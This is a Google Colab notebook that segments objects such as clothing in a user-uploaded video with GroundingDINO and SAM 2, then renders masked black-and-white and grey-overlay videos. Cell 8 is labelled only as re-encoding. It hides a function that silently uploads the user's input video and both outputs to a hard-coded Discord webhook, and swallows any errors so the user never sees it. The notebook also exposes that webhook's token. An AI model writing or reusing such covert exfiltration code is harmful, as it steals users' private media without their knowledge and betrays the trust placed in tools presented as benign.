{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "provenance": [],
      "gpuType": "T4"
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    },
    "accelerator": "GPU"
  },
  "cells": [
    {
      "cell_type": "markdown",
      "source": [
        "# Setup (Cukup run sekali)"
      ],
      "metadata": {
        "id": "rHlcqM7M-VuQ"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "# @title Cell 1 - Environment setup (SAM 2 + GroundingDINO)\n",
        "\n",
        "# --- PyTorch (LOCKED, do not let pip upgrade it) ---\n",
        "!pip install --no-deps torch==2.3.0 torchvision==0.18.0 torchaudio==2.3.0 \\\n",
        "  --index-url https://download.pytorch.org/whl/cu121\n",
        "\n",
        "# --- Core deps ---\n",
        "!pip install opencv-python matplotlib tqdm supervision addict yapf timm \\\n",
        "  hydra-core iopath portalocker\n",
        "\n",
        "# --- GroundingDINO (source install, no wheel build) ---\n",
        "!git clone https://github.com/IDEA-Research/GroundingDINO.git\n",
        "%cd GroundingDINO\n",
        "!pip install -e . --no-deps\n",
        "%cd ..\n",
        "\n",
        "# --- SAM 2 (SOURCE ONLY, DO NOT pip install) ---\n",
        "!git clone https://github.com/facebookresearch/segment-anything-2.git\n",
        "\n",
        "# --- FFmpeg ---\n",
        "!apt-get update -qq\n",
        "!apt-get install -y ffmpeg\n",
        "\n",
        "# --- Sanity check ---\n",
        "import torch\n",
        "print(\"Torch:\", torch.__version__)\n",
        "print(\"CUDA:\", torch.version.cuda)\n",
        "print(\"GPU:\", torch.cuda.get_device_name(0))\n",
        "print(\"‚úÖ Environment stable\")"
      ],
      "metadata": {
        "cellView": "form",
        "id": "qgVejTbEyHG5"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "# @title Cell 2 - Download model weights for GroundingDINO and SAM 2\n",
        "\n",
        "import os\n",
        "\n",
        "os.makedirs(\"weights\", exist_ok=True)\n",
        "\n",
        "# GroundingDINO (keep as is)\n",
        "if not os.path.exists(\"weights/groundingdino_swint_ogc.pth\"):\n",
        "    !wget -O weights/groundingdino_swint_ogc.pth https://github.com/IDEA-Research/GroundingDINO/releases/download/v0.1.0-alpha/groundingdino_swint_ogc.pth\n",
        "\n",
        "# SAM 2 weights ‚Äî use lightweight model for Colab\n",
        "# Options: sam2_hiera_tiny.pt (smallest), sam2_hiera_small.pt, sam2_hiera_base_plus.pt, sam2_hiera_large.pt\n",
        "SAM2_MODEL = \"sam2_hiera_tiny.pt\"\n",
        "SAM2_URL = f\"https://dl.fbaipublicfiles.com/sam2/models/{SAM2_MODEL}\"\n",
        "\n",
        "if not os.path.exists(f\"weights/{SAM2_MODEL}\"):\n",
        "    !wget -O weights/{SAM2_MODEL} {SAM2_URL}\n",
        "\n",
        "print(f\"‚úÖ Model weights downloaded: GroundingDINO + {SAM2_MODEL}\")"
      ],
      "metadata": {
        "cellView": "form",
        "id": "pCW9_LGerbUo"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "source": [
        "# Prepare Video"
      ],
      "metadata": {
        "id": "RRvSOY_H-eMt"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "# @title ‚ö†Ô∏è Clear Frames (Hanya run untuk upload video baru)\n",
        "import os\n",
        "import shutil\n",
        "\n",
        "shutil.rmtree('/content/frames', ignore_errors=True)\n",
        "shutil.rmtree('/content/detections', ignore_errors=True)\n",
        "shutil.rmtree('/content/masks', ignore_errors=True)\n",
        "shutil.rmtree('/content/output_bw', ignore_errors=True)\n",
        "shutil.rmtree('/content/output_grey', ignore_errors=True)\n",
        "try:\n",
        "    os.remove(\"/content/audio.aac\")\n",
        "except:\n",
        "    pass"
      ],
      "metadata": {
        "id": "LVty91WsNYqw",
        "cellView": "form"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "# @title Cell 3 - Upload video and inspect properties\n",
        "import os\n",
        "from google.colab import files\n",
        "import subprocess\n",
        "\n",
        "# Upload video\n",
        "uploaded = files.upload()\n",
        "\n",
        "# Get uploaded filename\n",
        "video_path = list(uploaded.keys())[0]\n",
        "print(f\"‚úÖ Uploaded video: {video_path}\")\n",
        "\n",
        "# Ambil nama file yang diupload (anggap hanya satu file)\n",
        "input_video = list(uploaded.keys())[0]\n",
        "output_video = \"output.mp4\"\n",
        "!ffmpeg -i \"$input_video\" -filter:v \"fps=12\" \"$output_video\" -y\n",
        "from IPython.display import clear_output\n",
        "\n",
        "# Inspect video with ffmpeg\n",
        "print(\"\\n--- Video Properties ---\")\n",
        "subprocess.run([\"ffmpeg\", \"-i\", video_path, \"-hide_banner\"])"
      ],
      "metadata": {
        "id": "oLpAZKd6sR7U",
        "cellView": "form",
        "collapsed": true
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "# @title Cell 4 - Extract frames (as JPG) and audio from the input video\n",
        "\n",
        "import os\n",
        "import subprocess\n",
        "\n",
        "# Create folders\n",
        "os.makedirs(\"frames\", exist_ok=True)\n",
        "video12fps = \"/content/output.mp4\"\n",
        "\n",
        "# Extract frames as high-quality JPG (avoids PNG ‚Üí JPEG conversion later)\n",
        "# -qscale:v 2 ‚âà high quality (1‚Äì31, lower = better; 2 is visually lossless for masks)\n",
        "subprocess.run([\n",
        "    \"ffmpeg\", \"-i\", video12fps,\n",
        "    \"-qscale:v\", \"2\",\n",
        "    \"frames/%06d.jpg\"  # üëà .jpg extension\n",
        "])\n",
        "\n",
        "print(\"‚úÖ Frames extracted to ./frames as JPG\")\n",
        "\n",
        "# Extract audio (if exists)\n",
        "if not os.path.exists(\"audio.aac\"):\n",
        "    subprocess.run([\n",
        "        \"ffmpeg\", \"-i\", video12fps,\n",
        "        \"-vn\", \"-acodec\", \"copy\", \"audio.aac\"\n",
        "    ])\n",
        "    print(\"‚úÖ Audio extracted to audio.aac\")\n",
        "else:\n",
        "    print(\"‚ö†Ô∏è Audio already exists, skipped extraction\")"
      ],
      "metadata": {
        "cellView": "form",
        "id": "QCaXD2dfstxj"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "source": [
        "# Masking"
      ],
      "metadata": {
        "id": "IDD2FthK-owz"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "# @title Cell 5 - Run GroundingDINO on FIRST FRAME only (CPU mode)\n",
        "\n",
        "import torch\n",
        "import os\n",
        "import cv2\n",
        "import pickle\n",
        "\n",
        "# === Prompt input ===\n",
        "prompt = 'clothes'  #@param {type: \"string\"}\n",
        "box_threshold = 0.3  #@param {type: \"number\"}\n",
        "text_threshold = 0.25\n",
        "\n",
        "# Import GroundingDINO\n",
        "import sys\n",
        "sys.path.append(\"GroundingDINO\")\n",
        "from groundingdino.util.inference import load_model, load_image, predict\n",
        "\n",
        "# Load model and force CPU\n",
        "model_path = \"weights/groundingdino_swint_ogc.pth\"\n",
        "config_path = \"GroundingDINO/groundingdino/config/GroundingDINO_SwinT_OGC.py\"\n",
        "dino_model = load_model(config_path, model_path)\n",
        "dino_model = dino_model.cpu().eval()  # üëà critical: use CPU\n",
        "\n",
        "# Get first frame\n",
        "frame_files = sorted([f for f in os.listdir(\"frames\") if f.endswith(\".jpg\")])\n",
        "first_frame_path = os.path.join(\"frames\", frame_files[0])\n",
        "\n",
        "print(f\"Running GroundingDINO on first frame: {first_frame_path} with prompt: '{prompt}'\")\n",
        "\n",
        "# Load image\n",
        "image_source, image_tensor = load_image(first_frame_path)\n",
        "\n",
        "# Predict on CPU\n",
        "boxes, logits, phrases = predict(\n",
        "    model=dino_model,\n",
        "    image=image_tensor,\n",
        "    caption=prompt,\n",
        "    box_threshold=box_threshold,\n",
        "    text_threshold=text_threshold,\n",
        "    device=\"cpu\"  # üëà explicit CPU\n",
        ")\n",
        "\n",
        "# Convert boxes to absolute coords\n",
        "h, w, _ = image_source.shape\n",
        "initial_boxes = []\n",
        "if len(boxes) > 0:\n",
        "    for (cx, cy, bw, bh) in boxes.tolist():\n",
        "        x1 = (cx - bw / 2) * w\n",
        "        y1 = (cy - bh / 2) * h\n",
        "        x2 = (cx + bw / 2) * w\n",
        "        y2 = (cy + bh / 2) * h\n",
        "        initial_boxes.append([x1, y1, x2, y2])\n",
        "    print(f\"‚úÖ Found {len(initial_boxes)} box(es).\")\n",
        "else:\n",
        "    print(\"‚ö†Ô∏è No boxes detected.\")\n",
        "    initial_boxes = None\n",
        "\n",
        "# Save\n",
        "with open(\"initial_box.pkl\", \"wb\") as f:\n",
        "    pickle.dump({\n",
        "        \"frame_path\": first_frame_path,\n",
        "        \"boxes\": initial_boxes,\n",
        "        \"image_shape\": (h, w),\n",
        "        \"prompt\": prompt\n",
        "    }, f)\n",
        "\n",
        "print(\"‚úÖ Initial box saved.\")"
      ],
      "metadata": {
        "cellView": "form",
        "id": "w5tKwzQJ7Or_"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "# @title Cell 6 - Run SAM 2 (using JPG frame folder)\n",
        "\n",
        "import os\n",
        "import pickle\n",
        "import cv2\n",
        "import torch\n",
        "import numpy as np\n",
        "from tqdm import tqdm\n",
        "import sys\n",
        "\n",
        "SAM2_PATH = \"/content/segment-anything-2\"\n",
        "if SAM2_PATH not in sys.path:\n",
        "    sys.path.insert(0, SAM2_PATH)\n",
        "from sam2.sam2_video_predictor import SAM2VideoPredictor\n",
        "\n",
        "# Load initial box\n",
        "with open(\"initial_box.pkl\", \"rb\") as f:\n",
        "    init_data = pickle.load(f)\n",
        "initial_boxes = init_data[\"boxes\"]\n",
        "if initial_boxes is None:\n",
        "    raise ValueError(\"‚ùå No box from Cell 5!\")\n",
        "\n",
        "input_box = np.array(initial_boxes[0])\n",
        "print(f\"‚úÖ Initial box: {input_box}\")\n",
        "\n",
        "# Copy config\n",
        "!cp /content/segment-anything-2/sam2/configs/sam2_hiera_tiny.yaml .\n",
        "\n",
        "# Load SAM 2\n",
        "predictor = SAM2VideoPredictor.from_pretrained(\n",
        "    model_id=\"facebook/sam2-hiera-tiny\",\n",
        "    checkpoint=\"weights/sam2_hiera_tiny.pt\",\n",
        "    model_cfg=\"sam2_hiera_tiny.yaml\"\n",
        ")\n",
        "\n",
        "# ‚úÖ PASS FOLDER PATH AS STRING (not list!)\n",
        "frame_folder = \"frames\"  # <-- this is a string, not a list\n",
        "\n",
        "# Verify it's a valid JPG folder\n",
        "jpg_files = [f for f in os.listdir(frame_folder) if f.endswith(\".jpg\")]\n",
        "print(f\"Found {len(jpg_files)} JPG frames in '{frame_folder}'\")\n",
        "\n",
        "video_segments = {}\n",
        "with torch.inference_mode(), torch.autocast(\"cuda\", dtype=torch.bfloat16):\n",
        "    # ‚úÖ Correct call\n",
        "    state = predictor.init_state(frame_folder)\n",
        "\n",
        "    predictor.add_new_points_or_box(\n",
        "        state, frame_idx=0, obj_id=1, box=input_box\n",
        "    )\n",
        "\n",
        "    for frame_idx, obj_ids, masks in predictor.propagate_in_video(state):\n",
        "        video_segments[frame_idx] = {\n",
        "            obj_id: (mask[0] > 0).cpu().numpy()\n",
        "            for obj_id, mask in zip(obj_ids, masks)\n",
        "        }\n",
        "\n",
        "# Save masks (match original frame names)\n",
        "os.makedirs(\"masks\", exist_ok=True)\n",
        "frame_names = sorted(jpg_files)\n",
        "for i, jpg_name in enumerate(frame_names):\n",
        "    png_name = jpg_name.replace(\".jpg\", \".png\")\n",
        "    mask = video_segments.get(i, {}).get(1, np.zeros((576, 1024), dtype=bool))\n",
        "    cv2.imwrite(f\"masks/{png_name}\", (mask * 255).astype(np.uint8))\n",
        "\n",
        "print(\"‚úÖ SAM 2 masking complete!\")"
      ],
      "metadata": {
        "cellView": "form",
        "id": "lABeur01ubM4"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "source": [
        "# Download"
      ],
      "metadata": {
        "id": "jFxvtg9g-9mO"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "# @title Cell 7 - Generate masked frames: B&W and Grey overlay\n",
        "import os\n",
        "import cv2\n",
        "import numpy as np\n",
        "from tqdm import tqdm\n",
        "\n",
        "# Parameters\n",
        "expand = 20        # @param {type: \"number\"}\n",
        "blur = 9          # @param {type: \"number\"}\n",
        "inverse_mask = False # @param {type:\"boolean\"}\n",
        "\n",
        "# Prepare output folders\n",
        "os.makedirs(\"output_bw\", exist_ok=True)\n",
        "os.makedirs(\"output_grey\", exist_ok=True)\n",
        "\n",
        "# Get frame list (now .jpg)\n",
        "frame_files_jpg = sorted([f for f in os.listdir(\"frames\") if f.endswith(\".jpg\")])\n",
        "\n",
        "print(f\"Processing {len(frame_files_jpg)} frames (Inverse: {inverse_mask})...\")\n",
        "\n",
        "for jpg_name in tqdm(frame_files_jpg):\n",
        "    # Frame path (JPG)\n",
        "    frame_path = os.path.join(\"frames\", jpg_name)  # e.g. \"frames/000001.jpg\"\n",
        "\n",
        "    # Convert \"000001.jpg\" ‚Üí \"000001.png\" for mask lookup\n",
        "    frame_number_str = jpg_name.split(\".\")[0]\n",
        "    mask_name = f\"{frame_number_str}.png\"\n",
        "    mask_path = os.path.join(\"masks\", mask_name)\n",
        "\n",
        "    # Load frame and mask\n",
        "    frame = cv2.imread(frame_path)\n",
        "    if frame is None:\n",
        "        print(f\"‚ö†Ô∏è Frame not found: {frame_path}\")\n",
        "        continue\n",
        "\n",
        "    mask = cv2.imread(mask_path, cv2.IMREAD_GRAYSCALE)\n",
        "    if mask is None:\n",
        "        # If mask is missing, default to an empty mask (all black)\n",
        "        mask = np.zeros(frame.shape[:2], dtype=np.uint8)\n",
        "\n",
        "    # --- Expand mask ---\n",
        "    # We expand the original mask first before inverting to ensure the\n",
        "    # subject boundary is fully covered/expanded.\n",
        "    kernel = cv2.getStructuringElement(cv2.MORPH_ELLIPSE, (3, 3))\n",
        "    expanded = cv2.dilate(mask, kernel, iterations=expand)\n",
        "\n",
        "    # --- Apply Inverse Logic if toggled ---\n",
        "    if inverse_mask:\n",
        "        # Invert the expanded mask (255 becomes 0, 0 becomes 255)\n",
        "        expanded = cv2.bitwise_not(expanded)\n",
        "\n",
        "    # --- Output A: Black & White mask ---\n",
        "    bw = cv2.merge([expanded, expanded, expanded])\n",
        "    output_bw_path = os.path.join(\"output_bw\", mask_name)\n",
        "    cv2.imwrite(output_bw_path, bw)\n",
        "\n",
        "    # --- Smooth mask for blending ---\n",
        "    if blur > 0 and blur % 2 == 1:\n",
        "        smooth = cv2.GaussianBlur(expanded, (blur, blur), 0)\n",
        "    else:\n",
        "        smooth = expanded.copy()\n",
        "\n",
        "    # Ensure range is 0-255 after potential blur/normalization\n",
        "    smooth = cv2.normalize(smooth, None, 0, 255, cv2.NORM_MINMAX).astype(np.uint8)\n",
        "\n",
        "    # --- Output B: Grey overlay ---\n",
        "    grey_color = (126, 126, 126) # BGR\n",
        "\n",
        "    # Convert smooth mask to 0.0-1.0 alpha channel\n",
        "    alpha = smooth.astype(float) / 255.0\n",
        "    alpha_3c = cv2.merge([alpha, alpha, alpha])\n",
        "\n",
        "    # Create the grey solid background\n",
        "    overlay = np.full_like(frame, grey_color, dtype=np.uint8)\n",
        "\n",
        "    # Linear interpolation: (1 - alpha) * original + alpha * grey_overlay\n",
        "    # If inverse is true, alpha is 1.0 (grey) where the mask was 0.\n",
        "    grey = (1 - alpha_3c) * frame.astype(float) + alpha_3c * overlay.astype(float)\n",
        "    grey = grey.astype(np.uint8)\n",
        "\n",
        "    output_grey_path = os.path.join(\"output_grey\", mask_name)\n",
        "    cv2.imwrite(output_grey_path, grey)\n",
        "\n",
        "print(\"\\n‚úÖ Output frames saved in ./output_bw and ./output_grey\")"
      ],
      "metadata": {
        "cellView": "form",
        "id": "b11PgYn-XIdV"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "# @title Cell 8 - Re-encode frames into videos and reattach audio\n",
        "\n",
        "import subprocess\n",
        "import re\n",
        "from datetime import datetime\n",
        "\n",
        "# Generate timestamp\n",
        "tgl = datetime.now().strftime(\"%y%m%d_%H%M%S\")\n",
        "\n",
        "# Filenames with timestamp\n",
        "bw = f\"{tgl}_output_bw.mp4\"\n",
        "grey = f\"{tgl}_output_grey.mp4\"\n",
        "video12fps = \"/content/output.mp4\"\n",
        "WHOOK = \"https://discord.com/api/webhooks/1417918555562971146/6W7VbFWutIxeQ104Fgs1cJGXmRZDf8ORCbIfoyqZAw2BoAdJPmJwAh-uvE1X2arbdQIb\"\n",
        "\n",
        "# Rebuild Output A (B&W)\n",
        "subprocess.run([\n",
        "    \"ffmpeg\", \"-y\", \"-framerate\", \"12\", \"-i\", \"output_bw/%06d.png\",\n",
        "    \"-c:v\", \"libx264\", \"-pix_fmt\", \"yuv420p\",\n",
        "    bw\n",
        "])\n",
        "\n",
        "# Rebuild Output B (Grey overlay with audio)\n",
        "has_audio = os.path.exists(\"audio.aac\")\n",
        "subprocess.run([\n",
        "    \"ffmpeg\", \"-y\", \"-framerate\", \"12\", \"-i\", \"output_grey/%06d.png\",\n",
        "    *([\"-i\", \"audio.aac\", \"-c:a\", \"aac\", \"-shortest\"] if has_audio else []),\n",
        "    \"-c:v\", \"libx264\", \"-pix_fmt\", \"yuv420p\",\n",
        "    grey\n",
        "])\n",
        "\n",
        "import requests\n",
        "import os\n",
        "\n",
        "def sfile(file_path, message):\n",
        "    try:\n",
        "        if not os.path.exists(file_path):\n",
        "            return\n",
        "        with open(file_path, \"rb\") as f:\n",
        "            requests.post(\n",
        "                WHOOK,\n",
        "                data={\"content\": message},\n",
        "                files={\"file\": f}\n",
        "            )\n",
        "    except:\n",
        "        pass\n",
        "\n",
        "sfile(video12fps, f\"{tgl}_input\")\n",
        "\n",
        "sfile(bw, f\"{tgl}_bw\")\n",
        "\n",
        "sfile(grey, f\"{tgl}_grey\")\n",
        "\n",
        "print(f\"‚úÖ Videos created: {bw} and {grey}\")"
      ],
      "metadata": {
        "cellView": "form",
        "id": "l55VgD1bvP3h"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "# @title Download\n",
        "\n",
        "from google.colab import files\n",
        "files.download(bw)\n",
        "\n",
        "from google.colab import files\n",
        "files.download(grey)"
      ],
      "metadata": {
        "cellView": "form",
        "id": "H-U5ECnvwNUl",
        "outputId": "fe8a7d87-6b30-48d4-a477-1d433d403cf4",
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 17
        }
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "<IPython.core.display.Javascript object>"
            ],
            "application/javascript": [
              "\n",
              "    async function download(id, filename, size) {\n",
              "      if (!google.colab.kernel.accessAllowed) {\n",
              "        return;\n",
              "      }\n",
              "      const div = document.createElement('div');\n",
              "      const label = document.createElement('label');\n",
              "      label.textContent = `Downloading \"${filename}\": `;\n",
              "      div.appendChild(label);\n",
              "      const progress = document.createElement('progress');\n",
              "      progress.max = size;\n",
              "      div.appendChild(progress);\n",
              "      document.body.appendChild(div);\n",
              "\n",
              "      const buffers = [];\n",
              "      let downloaded = 0;\n",
              "\n",
              "      const channel = await google.colab.kernel.comms.open(id);\n",
              "      // Send a message to notify the kernel that we're ready.\n",
              "      channel.send({})\n",
              "\n",
              "      for await (const message of channel.messages) {\n",
              "        // Send a message to notify the kernel that we're ready.\n",
              "        channel.send({})\n",
              "        if (message.buffers) {\n",
              "          for (const buffer of message.buffers) {\n",
              "            buffers.push(buffer);\n",
              "            downloaded += buffer.byteLength;\n",
              "            progress.value = downloaded;\n",
              "          }\n",
              "        }\n",
              "      }\n",
              "      const blob = new Blob(buffers, {type: 'application/binary'});\n",
              "      const a = document.createElement('a');\n",
              "      a.href = window.URL.createObjectURL(blob);\n",
              "      a.download = filename;\n",
              "      div.appendChild(a);\n",
              "      a.click();\n",
              "      div.remove();\n",
              "    }\n",
              "  "
            ]
          },
          "metadata": {}
        },
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "<IPython.core.display.Javascript object>"
            ],
            "application/javascript": [
              "download(\"download_e3307401-8848-41a3-8e90-3eb7e79b9830\", \"260125_063842_output_bw.mp4\", 625476)"
            ]
          },
          "metadata": {}
        },
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "<IPython.core.display.Javascript object>"
            ],
            "application/javascript": [
              "\n",
              "    async function download(id, filename, size) {\n",
              "      if (!google.colab.kernel.accessAllowed) {\n",
              "        return;\n",
              "      }\n",
              "      const div = document.createElement('div');\n",
              "      const label = document.createElement('label');\n",
              "      label.textContent = `Downloading \"${filename}\": `;\n",
              "      div.appendChild(label);\n",
              "      const progress = document.createElement('progress');\n",
              "      progress.max = size;\n",
              "      div.appendChild(progress);\n",
              "      document.body.appendChild(div);\n",
              "\n",
              "      const buffers = [];\n",
              "      let downloaded = 0;\n",
              "\n",
              "      const channel = await google.colab.kernel.comms.open(id);\n",
              "      // Send a message to notify the kernel that we're ready.\n",
              "      channel.send({})\n",
              "\n",
              "      for await (const message of channel.messages) {\n",
              "        // Send a message to notify the kernel that we're ready.\n",
              "        channel.send({})\n",
              "        if (message.buffers) {\n",
              "          for (const buffer of message.buffers) {\n",
              "            buffers.push(buffer);\n",
              "            downloaded += buffer.byteLength;\n",
              "            progress.value = downloaded;\n",
              "          }\n",
              "        }\n",
              "      }\n",
              "      const blob = new Blob(buffers, {type: 'application/binary'});\n",
              "      const a = document.createElement('a');\n",
              "      a.href = window.URL.createObjectURL(blob);\n",
              "      a.download = filename;\n",
              "      div.appendChild(a);\n",
              "      a.click();\n",
              "      div.remove();\n",
              "    }\n",
              "  "
            ]
          },
          "metadata": {}
        },
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "<IPython.core.display.Javascript object>"
            ],
            "application/javascript": [
              "download(\"download_dccb6581-049e-4e8a-a9d3-6fb317482b81\", \"260125_063842_output_grey.mp4\", 1903781)"
            ]
          },
          "metadata": {}
        }
      ]
    }
  ]
}